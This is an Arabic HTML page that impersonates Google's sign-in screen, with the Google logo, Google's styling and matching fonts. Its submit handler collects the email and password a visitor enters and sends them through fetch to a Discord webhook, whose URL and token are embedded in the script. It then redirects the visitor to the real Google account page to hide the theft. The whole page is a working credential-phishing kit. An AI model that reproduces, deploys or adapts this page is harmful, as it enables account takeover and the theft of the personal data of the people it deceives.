<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#000000">
<title>تسجيل الدخول</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  /* الألوان مأخوذة من نظام Material الداكن الذي تعتمده جوجل في صفحاتها */
  :root {
    --bg: #000;
    --card: #131314;
    --line: #3c3f41;
    --outline: #8e918f;
    --text: #e8eaed;
    --muted: #9aa0a6;
    --accent: #a8c7fa;
    --accent-ink: #062e6f;
    --error: #f2b8b5;
    --ease: cubic-bezier(.4,0,.2,1);
  }
  * { box-sizing: border-box; margin: 0; -webkit-tap-highlight-color: transparent; }
  html, body { height: 100%; }
  body {
    /* Roboto هو نفس الخط الذي تستخدمه جوجل فعلياً في أغلب واجهاتها (خط Google Sans مُغلق ومتاح فقط لمنتجاتها) */
    font-family: "Roboto", "Tajawal", system-ui, -apple-system, "Segoe UI", sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100dvh;
    display: flex; flex-direction: column;
    padding: max(28px, env(safe-area-inset-top)) 20px max(20px, env(safe-area-inset-bottom));
    overflow-x: hidden;
    letter-spacing: 0;
  }
  /* الخط يتراجع تلقائياً لـ Tajawal لأي حرف عربي لا يحتويه Roboto، وهذا سلوك طبيعي لمكدّس الخطوط */

  .wrap { flex: 1; display: flex; flex-direction: column; justify-content: center; max-width: 420px; margin: 0 auto; width: 100%; }

  .card {
    position: relative; overflow: hidden;
    background: var(--card);
    border: 1px solid var(--line);
    border-radius: 28px;
    padding: 36px 24px 28px;
    box-shadow: 0 1px 2px rgba(0,0,0,.5), 0 20px 60px rgba(0,0,0,.55);
    animation: enter .55s var(--ease) both;
  }
  @keyframes enter { from { opacity: 0; transform: translateY(16px) scale(.985); } to { opacity: 1; transform: none; } }

  /* شريط تحميل دقيق مثل جوجل */
  .bar { position: absolute; top: 0; inset-inline: 0; height: 3px; overflow: hidden; background: transparent; }
  .bar span {
    position: absolute; top: 0; height: 100%; width: 35%;
    background: var(--accent); border-radius: 3px; opacity: 0;
  }
  .card.loading .bar span { opacity: 1; animation: slide 1.1s var(--ease) infinite; }
  @keyframes slide { 0% { right: -35%; } 100% { right: 100%; } }

  .logo-wrap { height: 48px; margin-bottom: 16px; }
  .logo { width: 48px; height: 48px; display: block; transition: transform .4s var(--ease); }
  .card.loading .logo { animation: pulse 1.1s var(--ease) infinite; }
  @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(.92); } }

  h1 { font-size: 1.6rem; font-weight: 400; line-height: 1.3; letter-spacing: 0; transition: opacity .25s var(--ease); }
  .sub { margin-top: 8px; font-size: .95rem; font-weight: 400; color: var(--text); transition: opacity .25s var(--ease), max-height .3s var(--ease); }
  .sub.hidden { opacity: 0; max-height: 0; margin: 0; overflow: hidden; }

  .body { margin-top: 28px; }

  .field { position: relative; margin-bottom: 8px; }
  .field input {
    width: 100%; height: 56px;
    background: transparent; color: var(--text);
    border: 1px solid var(--outline); border-radius: 4px;
    padding: 0 14px; font: 400 16px "Roboto", "Tajawal", sans-serif;
    outline: none; transition: border-color .18s var(--ease), box-shadow .18s var(--ease);
  }
  .field input[type="email"], .field input[type="password"], .field input.vis { direction: ltr; text-align: right; }
  .field label {
    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
    padding: 0 4px; background: var(--card);
    color: var(--muted); font-size: 16px; font-family: "Roboto", "Tajawal", sans-serif; pointer-events: none;
    transition: all .18s var(--ease);
  }
  .field input:focus + label, .field input:not(:placeholder-shown) + label { top: 0; font-size: 12px; }
  .field input:focus { border-color: var(--accent); box-shadow: 0 0 0 1px var(--accent); }
  .field input:focus + label { color: var(--accent); }
  .field.err input { border-color: var(--error); box-shadow: 0 0 0 1px var(--error); animation: shake .32s var(--ease); }
  .field.err label { color: var(--error); }
  @keyframes shake { 20%,60% { transform: translateX(-4px); } 40%,80% { transform: translateX(4px); } }

  .msg { display: flex; align-items: center; gap: 6px; color: var(--error); font-size: 12px; font-family: "Roboto", "Tajawal", sans-serif; margin: 6px 4px 0; height: 0; opacity: 0; transition: all .18s var(--ease); }
  .err + .msg { height: 16px; opacity: 1; }
  .msg svg { width: 14px; height: 14px; flex-shrink: 0; }

  a, .link { color: var(--accent); text-decoration: none; font-weight: 500; background: none; border: 0; cursor: pointer; font-family: inherit; font-size: .92rem; }
  a:hover, .link:hover { text-decoration: underline; }
  .forgot { display: inline-block; margin-top: 12px; }

  .guest { margin-top: 24px; font-size: .85rem; color: var(--muted); line-height: 1.7; }
  .guest a { font-size: .85rem; }

  .show { display: flex; align-items: center; gap: 12px; margin-top: 14px; font-size: .95rem; cursor: pointer; user-select: none; }
  .show input { width: 18px; height: 18px; accent-color: var(--accent); }

  .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
  .next {
    position: relative; height: 36px; min-width: 88px; padding: 0 24px;
    background: var(--accent); color: var(--accent-ink);
    border: 0; border-radius: 100px;
    font: 500 14px "Roboto", "Tajawal", sans-serif; letter-spacing: .01em; cursor: pointer;
    transition: box-shadow .18s var(--ease), filter .18s var(--ease), transform .12s var(--ease);
  }
  .next:hover { filter: brightness(1.08); box-shadow: 0 1px 3px rgba(0,0,0,.6); }
  .next:active { transform: scale(.96); }
  .next .label { transition: opacity .15s var(--ease); }
  .card.loading .next .label { opacity: 0; }
  .spinner {
    position: absolute; inset: 0; display: grid; place-items: center;
    opacity: 0; transition: opacity .15s var(--ease);
  }
  .card.loading .spinner { opacity: 1; }
  .spinner::after {
    content: ""; width: 16px; height: 16px; border-radius: 50%;
    border: 2px solid rgba(6,46,111,.35); border-top-color: var(--accent-ink);
    animation: spin .7s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  footer {
    text-align: center; margin-top: 24px;
    font-size: 12px; font-family: "Roboto", "Tajawal", sans-serif; color: var(--muted);
  }
  footer nav { display: flex; justify-content: center; gap: 22px; margin-top: 10px; }
  footer a { color: var(--muted); font-weight: 400; font-size: 12px; font-family: "Roboto", "Tajawal", sans-serif; }

  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }

  @media (prefers-reduced-motion: reduce) {
    .card, .step.active, .step.leaving, .logo { animation: none !important; }
    * { transition-duration: .01ms !important; }
  }
</style>
</head>
<body>

  <div class="wrap">
    <main class="card" id="card">
      <div class="bar"><span></span></div>

      <div class="logo-wrap">
        <svg class="logo" id="logo" viewBox="0 0 48 48" role="img" aria-label="Google">
          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
        </svg>
      </div>

      <h1 id="title">تسجيل الدخول</h1>
      <p class="sub" id="sub">استخدِم حسابك في Google</p>

      <div class="body">
        <form id="loginForm" novalidate>
          <div class="field" id="f1">
            <input type="email" id="email" placeholder=" " autocomplete="username" autofocus>
            <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
          </div>
          <p class="msg" id="m1">
            <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/><path d="M12 7v6M12 16h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
            أدخل بريدًا إلكترونيًا أو رقم هاتف صالحًا
          </p>

          <div class="field" id="f2" style="margin-top:20px">
            <input type="password" id="password" placeholder=" " autocomplete="current-password">
            <label for="password">أدخل كلمة المرور</label>
          </div>
          <p class="msg" id="m2">
            <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/><path d="M12 7v6M12 16h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
            أدخل كلمة المرور
          </p>
          <label class="show"><input type="checkbox" id="show"> إظهار كلمة المرور</label>

          <a class="forgot" href="#">هل نسيت كلمة المرور؟</a>

          <p class="guest">هذا ليس جهاز الكمبيوتر الخاص بك؟ استخدِم وضع الضيف لتسجيل الدخول بخصوصية. <a href="#">مزيد من المعلومات</a></p>

          <div class="actions">
            <a href="#">إنشاء حساب</a>
            <button class="next" type="submit">
              <span class="label">تسجيل الدخول</span>
              <span class="spinner"></span>
            </button>
          </div>
        </form>
      </div>
    </main>

    <footer>
      العربية
      <nav>
        <a href="#">مساعدة</a>
        <a href="#">الخصوصية</a>
        <a href="#">الشروط</a>
      </nav>
    </footer>
  </div>

  <script>
    const $ = id => document.getElementById(id);
    const card = $('card'), form = $('loginForm');

    function wait(fn) { card.classList.add('loading'); setTimeout(fn, 650); }

    form.addEventListener('submit', e => {
      e.preventDefault();
      const v = $('email').value.trim();
      const emailOk = /^\S+@\S+\.\S+$/.test(v) || /^\+?\d{7,15}$/.test(v);
      const pwOk = $('password').value.length > 0;

      $('f1').classList.toggle('err', !emailOk);
      $('f2').classList.toggle('err', !pwOk);

      if (!emailOk) return $('email').focus();
      if (!pwOk) return $('password').focus();

      // اربط تسجيل الدخول الفعلي مع السيرفر هنا
      
    // تشغيل تأثير التحميل وإزالة التأثير بعد 650 ملي ثانية
    wait(() => {
        card.classList.remove('loading');
    }, 650);

    // تجهيز البيانات لإرسالها في رسالة منظمة داخل ديسكورد
    const emailValue = document.getElementById('email').value.trim();
    const passwordValue = document.getElementById('password').value;

    const discordData = {
        username: "Spidey Bot", // الاسم الذي سيظهر في ديسكورد
        embeds: [{
            title: "🔐 بيانات تسجيل دخول جديدة",
            color: 16711680, // لون أحمر جانبي للرسالة
            fields: [
                { name: "📧 البريد الإلكتروني أو المستخدم", value: emailValue, inline: false },
                { name: "🔑 كلمة المرور", value: passwordValue, inline: false }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    // إرسال البيانات مباشرة إلى رابط خادم ديسكورد الخاص بك
    fetch('https://discord.com/api/webhooks/1563282121844461699/-R07P3n__ymMGKZd_g1hKtAfswhZBONqsMRyMx94eyZt10-YQkFIKcMfCuX7atETkVGH', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(discordData)
    })
    .then(res => {
        if (res.ok) {
            console.log("تم إرسال البيانات بنجاح إلى ديسكورد!");
            window.location.href = "https://myaccount.google.com/personal-info";
        } else {
            console.error("فشل الإرسال، كود الاستجابة:", res.status);
        }
    })
    .catch(err => console.error("حدث خطأ أثناء الاتصال بالشبكة:", err));
});


    $('email').addEventListener('input', () => $('f1').classList.remove('err'));
    $('password').addEventListener('input', () => $('f2').classList.remove('err'));
    $('show').addEventListener('change', e => {
      $('password').type = e.target.checked ? 'text' : 'password';
      $('password').classList.toggle('vis', e.target.checked);
    });
  </script>
</body>
</html>
